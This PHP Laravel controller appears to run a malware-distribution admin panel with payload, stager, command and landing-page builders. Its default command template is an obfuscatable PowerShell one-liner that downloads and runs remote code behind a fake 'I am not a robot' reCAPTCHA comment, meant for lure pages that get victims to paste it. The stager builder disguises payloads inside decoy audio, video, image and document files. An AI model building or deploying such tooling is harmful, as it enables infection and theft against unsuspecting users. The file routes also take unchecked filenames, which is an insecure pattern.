<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Inertia\Inertia;
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

class ToolsController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        return Inertia::render('Admin/Tools/Index');
    }

    /**
     * Display the Payload Builder page.
     */
    public function payloadBuilder()
    {
        return Inertia::render('Admin/Tools/PayloadBuilder/Index');
    }

    /**
     * Display the Stager Builder page.
     */
    public function stagerBuilder()
    {
        $formats = [];
        $mimeTypes = [];
        $headerMap = config('stager_header_map');

        foreach ($headerMap as $group => $groupFormats) {
            $formats[$group] = array_keys($groupFormats);
            foreach ($groupFormats as $ext => $header) {
                $mimeTypes[$ext] = $this->guessMimeType($ext);
            }
        }

        return Inertia::render('Admin/Tools/StagerBuilder/Index', [
            'formats' => $formats,
            'mimeTypes' => $mimeTypes
        ]);
    }

    /**
     * Display the Command Builder page.
     */
    public function commandBuilder()
    {
        return Inertia::render('Admin/Tools/CommandBuilder/Index');
    }

    /**
     * Display the Lander Templates tool.
     */
    public function landerTemplates()
    {
        // Retrieve all HTML files from the 'lander_templates' directory in storage
        $files = Storage::files('lander_templates');
        // Extract just the file names
        $templates = array_map(fn($file) => basename($file), $files);
        return Inertia::render('Admin/Tools/LanderTemplates/Index', [
            'templates' => $templates,
        ]);
    }

    /**
     * Display the Lander Builder page.
     */
    public function landerBuilder()
    {
        return Inertia::render('Admin/Tools/LanderBuilder/Index');
    }

    public function generatePayload(Request $request)
    {
        $request->validate([
            'payloadUrl' => 'required|url',
            'payloadName' => 'required|string|max:255',
            'campaignId' => 'nullable|string|max:255',
            'buildTag' => 'required|string|max:255',
        ]);

        $url = $request->input('payloadUrl');
        $name = $request->input('payloadName');
        $campaign = $request->input('campaignId');
        $buildTag = $request->input('buildTag');

        $args = ['python3', base_path('scripts/payload_generator.py'), $url, $name, $campaign];
        if ($campaign) {
            $args[] = $campaign;
        }

        $process = new Process($args);
        $process->run();

        if (!$process->isSuccessful()) {
            return back()->withErrors(['payloadError' => $process->getErrorOutput()]);
        }

        $generatedPath = trim($process->getOutput());

        $filename = basename($generatedPath);
        $payloadContents = file_get_contents($generatedPath);

        $path = "payloads/{$buildTag}/{$filename}";

        // if (Storage::exists($path)) {
        //     return back()->withErrors(['payloadName' => 'A payload with this filename already exists.']);
        // }

        Storage::put($path, $payloadContents);

        return redirect()->route('admin.tools.payloadbuilder.index')
            ->with('success', 'Payload generated successfully!')
            ->with('filename', $filename)
            ->with('build_tag', $buildTag);
    }

    /**
     * Export the generated payload to a file.
     */
    public function exportPayload(Request $request)
    {
        $filename = $request->query('filename');
        $buildTag = $request->query('build_tag');
    
        if (!$filename || !$buildTag || !Storage::exists("payloads/{$buildTag}/{$filename}")) {
            abort(404);
        }
    
        return Storage::download("payloads/{$buildTag}/{$filename}");
    }

    public function payloadsJson(Request $request)
    {
        $perPage = 10;
        $all = Storage::allFiles('payloads');

        $flattened = collect($all)
            ->filter(fn($path) => str_ends_with($path, '.txt'))
            ->map(function ($path) {
                [$_, $tag, $file] = explode('/', $path, 3);
                return ['build_tag' => $tag, 'filename' => $file];
            })
            ->sortBy('filename')
            ->values();

        $page = $request->get('page', 1);
        $offset = ($page - 1) * $perPage;
        $paginated = $flattened->slice($offset, $perPage)->values();

        $paginator = new \Illuminate\Pagination\LengthAwarePaginator(
            $paginated,
            $flattened->count(),
            $perPage,
            $page,
            ['path' => route('admin.tools.payloads.json')]
        );

        return response()->json($paginator);
    }

    /**
     * Delete a stored payload.
     */
    public function deletePayload(Request $request, $buildTag, $filename)
    {
        if (Storage::exists("payloads/{$buildTag}/{$filename}")) {
            Storage::delete("payloads/{$buildTag}/{$filename}");
            return response()->json(['success' => true]);
        }
        return response()->json(['success' => false], 404);
    }

    public function generateStager(Request $request)
    {
        $request->validate([
            'remoteTxtUrl'    => 'required|url',
            'outputFilename'  => 'required|string|max:255',
            'outputFormat'    => 'required|string',
            'decoyFile'       => 'required|file',
        ]);
    
        $url       = $request->input('remoteTxtUrl');
        $format    = $request->input('outputFormat');
        $baseName  = pathinfo($request->input('outputFilename'), PATHINFO_FILENAME);
        $decoy     = $request->file('decoyFile');
    
        $filename     = $baseName . '.' . $format;
        $tempFolder   = storage_path('app/tmp_stagers'); // TEMP ONLY for script
        $ext          = $decoy->getClientOriginalExtension();
        $decoyPath    = $tempFolder . '/decoy_' . uniqid() . '.' . $ext;
    
        // Ensure temp folder exists
        if (!is_dir($tempFolder)) {
            mkdir($tempFolder, 0775, true);
        }
    
        // Move decoy to temp
        $decoy->move(dirname($decoyPath), basename($decoyPath));
    
        // Encode header map for script
        $headerMap     = config('stager_header_map');
        $headerMapJson = base64_encode(json_encode($headerMap, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR));
    
        $process = new Process([
            'python3',
            base_path('scripts/stager_generator.py'),
            $url,
            $decoyPath,
            $tempFolder,
            $filename,
            $format,
            $headerMapJson
        ]);
    
        $process->run();

        // Cleanup decoy file
        if (file_exists($decoyPath)) {
            unlink($decoyPath);
        }
    
        if (!$process->isSuccessful()) {
            $this->deleteDirectory($tempFolder);
            return response()->json(['error' => $process->getErrorOutput()], 500);
        }
    
        $finalPath = trim($process->getOutput());
        $finalFile = basename($finalPath);

        // ⏳ Wait briefly for file to fully flush
        usleep(200000); // 0.2 seconds

        if (!file_exists($finalPath)) {
            return response()->json(['error' => 'Generated stager file not found.'], 500);
        }
    
        // Read and store final file
        $content = file_get_contents($finalPath);
    
        if (!Storage::exists('stagers')) {
            Storage::makeDirectory('stagers');
        }
    
        Storage::put("stagers/{$finalFile}", $content);
        unlink($finalPath); // Clean up final file from tmp
    
        $this->deleteDirectory($tempFolder);

        return response()->json(['filename' => $finalFile]);
    }

    /**
     * Recursively delete a directory.
     */
    private function deleteDirectory($dir)
    {
        if (!is_dir($dir)) return;

        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $fullPath = "$dir/$file";
            is_dir($fullPath) ? $this->deleteDirectory($fullPath) : unlink($fullPath);
        }
        rmdir($dir);
    }  

    // Export stager
    public function exportStager(Request $request)
    {
        $filename = $request->query('filename') ?? $request->route('filename');

        if (!$filename || !Storage::exists("stagers/{$filename}")) {
            abort(404);
        }

        $fullPath = Storage::path("stagers/{$filename}");
        $extension = pathinfo($filename, PATHINFO_EXTENSION);
        $mimeType = $this->guessMimeType($extension); // Use your helper method

        return response()->download($fullPath, $filename, [
            'Content-Type' => $mimeType,
            'Content-Disposition' => 'attachment; filename="' . $filename . '"',
        ]);
    }

    // List stagers
    public function stagersJson(Request $request)
    {
        $perPage = 10;
        $files = collect(Storage::files('stagers'))
            ->filter(function ($file) {
                $basename = basename($file);
                return !in_array($basename, ['.DS_Store', '.gitkeep']);
            })
            ->map(fn($file) => basename($file))
            ->sort()
            ->values();
    
        $page = $request->get('page', 1);
        $offset = ($page - 1) * $perPage;
    
        $paginated = $files->slice($offset, $perPage)->values();
    
        $paginator = new \Illuminate\Pagination\LengthAwarePaginator(
            $paginated,
            $files->count(),
            $perPage,
            $page,
            ['path' => route('admin.tools.stagers.json')]
        );
    
        return response()->json($paginator);
    }    

    // Delete stager
    public function deleteStager($filename)
    {
        if (Storage::exists("stagers/{$filename}")) {
            Storage::delete("stagers/{$filename}");
            return response()->json(['success' => true]);
        }
        return response()->json(['success' => false], 404);
    }

    private function guessMimeType($ext)
    {
        $map = [
            // 🎵 Audio
            'ogg' => 'audio/ogg',
            'opus' => 'audio/ogg',
            'mp3' => 'audio/mpeg',
            'mp2' => 'audio/mpeg',
            'wav' => 'audio/wav',
            'aiff' => 'audio/aiff',
            'aac' => 'audio/aac',
            'm4a' => 'audio/mp4',
            'alac' => 'audio/mp4',
            'flac' => 'audio/flac',
            'ac3' => 'audio/ac3',
            'dts' => 'audio/vnd.dts',
            'mid' => 'audio/midi',
            'amr' => 'audio/amr',
            'wma' => 'audio/x-ms-wma',
            'ra' => 'audio/vnd.rn-realaudio',
            'voc' => 'audio/x-voc',
            'vox' => 'audio/x-voxware',
            'snd' => 'audio/basic',
            'au' => 'audio/basic',
            's3m' => 'audio/s3m',
            'stm' => 'audio/x-stm',
            'mod' => 'audio/mod',
            'mo3' => 'audio/x-mo3',
            'sf2' => 'audio/x-soundfont',
            'it' => 'audio/it',
            'msv' => 'audio/x-msv',
            'shn' => 'audio/x-shorten',

            // 🎥 Video
            'mp4' => 'video/mp4',
            'm4v' => 'video/x-m4v',
            'mov' => 'video/quicktime',
            'avi' => 'video/x-msvideo',
            'webm' => 'video/webm',
            'flv' => 'video/x-flv',
            'f4v' => 'video/x-f4v',
            'mkv' => 'video/x-matroska',
            'ts' => 'video/MP2T',
            'wmv' => 'video/x-ms-wmv',
            'rm' => 'application/vnd.rn-realmedia',
            'divx' => 'video/divx',
            'mpg' => 'video/mpeg',
            'mpeg' => 'video/mpeg',
            'asf' => 'video/x-ms-asf',
            'nut' => 'video/nut',
            'viv' => 'video/vnd.vivo',
            'roq' => 'video/roq',
            'smk' => 'video/smk',
            'bik' => 'video/bink',
            'mve' => 'video/x-mve',
            'nsv' => 'video/x-nsv',
            'r3d' => 'video/x-red',
            'mjpeg' => 'video/mjpeg',
            '3gp' => 'video/3gpp',
            '3g2' => 'video/3gpp2',

            // 🖼️ Image
            'png' => 'image/png',
            'jpg' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'bmp' => 'image/bmp',
            'tiff' => 'image/tiff',
            'ico' => 'image/x-icon',
            'webp' => 'image/webp',
            'heic' => 'image/heic',
            'jfif' => 'image/jpeg',
            'exif' => 'image/jpeg',

            // 📄 Documents
            'pdf' => 'application/pdf',
            'doc' => 'application/msword',
            'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            'ppt' => 'application/vnd.ms-powerpoint',
            'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            'xls' => 'application/vnd.ms-excel',
            'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'rtf' => 'application/rtf',
            'odt' => 'application/vnd.oasis.opendocument.text',
            'odp' => 'application/vnd.oasis.opendocument.presentation',
            'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
            'epub' => 'application/epub+zip',
            'xps' => 'application/vnd.ms-xpsdocument',
        ];

        return $map[strtolower($ext)] ?? 'application/octet-stream';
    }

    /**
     * Generate the obfuscated command.
     */
    public function generateCommand(Request $request)
    {
        $request->validate([
            'custom_command' => 'nullable|string',
            'file_url' => 'nullable|url',
            'obfuscation_technique' => 'nullable|in:base64,rot13',
            'obfuscate_url' => 'boolean'
        ]);

        $customCommand = $request->input('custom_command');
        $inputFileUrl = $request->input('file_url');
        $technique = $request->input('obfuscation_technique');
        $obfuscateUrl = $request->boolean('obfuscate_url');

        // Determine the file URL:
        if (!empty($inputFileUrl)) {
            // Use the file_url input if provided.
            $fileUrl = $inputFileUrl;
        } elseif ($customCommand) {
            // Otherwise, try to extract a URL from the custom command.
            preg_match_all('/https?:\/\/[^\s\'"]+/', $customCommand, $matches);
            if (!empty($matches[0])) {
                $fileUrl = $matches[0][0];
            } else {
                // If no URL is found, force file_url to be required.
                $request->validate([
                    'file_url' => 'required|url'
                ]);
            }
        } else {
            // If neither file_url nor custom command is provided, then file_url is required.
            $request->validate([
                'file_url' => 'required|url'
            ]);
        }

        // Build the base command:
        if ($customCommand) {
            // If a custom command is provided, replace the first URL found in it with $fileUrl.
            preg_match_all('/https?:\/\/[^\s\'"]+/', $customCommand, $matches);
            if (!empty($matches[0])) {
                $command = str_replace($matches[0][0], $fileUrl, $customCommand);
            } else {
                $command = $customCommand;
            }
        } else {
            // No custom command provided; use a default command template.
            $command = "POWERshelL -w 1 . Invoke-Expression ('$fileUrl'|ForEach-Object{(Invoke-WebRequest (Variable _).Value)}).Content # ''I am not a robot: rėCAΡTCHA Verification ID: 7811''";
        }

        // Obfuscate the file URL in the command if requested.
        if ($obfuscateUrl) {
            $obfuscatedUrl = $this->obfuscateUrl($fileUrl);
            // Replace all occurrences of the original file URL with the obfuscated version.
            $command = str_replace($fileUrl, $obfuscatedUrl, $command);
            $fileUrl = $obfuscatedUrl;
        }
    
        // Apply the overall obfuscation technique to the entire command if specified.
        switch ($technique) {
            case 'base64':
                $command = base64_encode($command);
                break;
            case 'rot13':
                $command = str_rot13($command);
                break;
            default:
                // No additional obfuscation.
                break;
        }

        return redirect()->route('admin.tools.commandbuilder.index')
            ->with('success', 'Command generated successfully!')
            ->with('command', $command);
    }

    /**
     * Export the generated command to a file.
     */
    public function exportCommand(Request $request)
    {
        $request->validate([
            'command' => 'required|string',
        ]);

        $command = $request->input('command');
        $filename = 'command.txt';

        return response()->streamDownload(function () use ($command) {
            echo $command;
        }, $filename, [
            'Content-Type' => 'text/plain',
        ]);
    }

    /**
     * Simulate a dry-run of the generated command.
     *
     * This method decodes the command (if needed) based on the provided technique,
     * then returns a simulated execution report without actually running the command.
     */
    public function testCommand(Request $request)
    {
        $request->validate([
            'command'   => 'required|string',
            'technique' => 'nullable|in:base64,rot13'
        ]);

        $command = $request->input('command');
        $technique = $request->input('technique');

        // Decode the command if an obfuscation technique was applied.
        if ($technique === 'base64') {
            $decodedCommand = base64_decode($command, true);
            if ($decodedCommand === false) {
                $decodedCommand = "Error: Invalid base64 encoding.";
            }
        } elseif ($technique === 'rot13') {
            $decodedCommand = str_rot13($command);
        } else {
            $decodedCommand = $command;
        }

        // Optionally simulate a short delay to mimic execution time.
        sleep(1);

        // Build a simulated dry-run execution report.
        $output = "Dry-Run Execution Report:\n";
        $output .= "----------------------------------------\n";
        $output .= "Tested Command:\n" . $command . "\n\n";
        $output .= "Decoded Command:\n" . $decodedCommand . "\n\n";
        $output .= "Status: Command appears syntactically correct.\n";
        $output .= "Simulated Execution Output:\n";
        $output .= "Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n";
        $output .= "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\n";
        $output .= "----------------------------------------\n";
        $output .= "Note: This is a dry-run. The command was not actually executed.\n";

        return redirect()->route('admin.tools.commandbuilder.index')
            ->with('success', 'Command tested successfully!')
            ->with('test_output', $output);
    }

    /**
     * Helper function to obfuscate a URL by splitting it at random positions and rejoining with a double quote.
     *
     * @param string $url
     * @return string
     */
    private function obfuscateUrl(string $url): string
    {
        $result = '';
        $len = strlen($url);
        
        // Iterate over every character in the URL.
        for ($i = 0; $i < $len; $i++) {
            $result .= $url[$i];
            
            // Only attempt to insert a quote if this is not the last character.
            if ($i < $len - 1) {
                // 30% chance to insert a double quote after the current character.
                if (mt_rand(0, 99) < 30) {
                    // Ensure we don't insert a double quote if the last character is already a double quote.
                    if (substr($result, -1) !== '"') {
                        $result .= '"';
                    }
                }
            }
        }
        
        return $result;
    }

    public function landerTemplatesJson()
    {
        $files = Storage::files('lander_templates');
        $templates = array_map(fn($file) => basename($file), $files);
        return response()->json(['templates' => $templates]);
    }

    /**
     * Store a new lander template (HTML file) in storage.
     */
    public function storeLanderTemplate(Request $request)
    {
        $request->validate([
            'name' => 'required|string',
            'content' => 'required|string',
        ]);

        // Ensure the template content contains the required placeholder
        if (strpos($request->input('content'), '{commandPlaceholder}') === false) {
            return response()->json([
                'success' => false,
                'message' => 'Template must contain the {commandPlaceholder} placeholder.'
            ], 422);
        }

        // Ensure the storage directory exists
        if (!Storage::exists('lander_templates')) {
            Storage::makeDirectory('lander_templates');
        }

        $filename = $request->input('name') . '.html';
        Storage::put("lander_templates/{$filename}", $request->input('content'));

        return response()->json(['success' => true]);
    }

    /**
     * Preview a stored lander template.
     */
    public function previewLanderTemplate(Request $request)
    {
        $filename = $request->get('filename');
        if (!$filename || !Storage::exists("lander_templates/{$filename}")) {
            return response()->json(['content' => 'Template not found.'], 404);
        }
        $content = Storage::get("lander_templates/{$filename}");
        return response()->json(['content' => $content]);
    }

    /**
     * Delete a stored lander template.
     */
    public function deleteLanderTemplate(Request $request, $filename)
    {
        if (Storage::exists("lander_templates/{$filename}")) {
            Storage::delete("lander_templates/{$filename}");
            return response()->json(['success' => true]);
        }
        return response()->json(['success' => false], 404);
    }
}
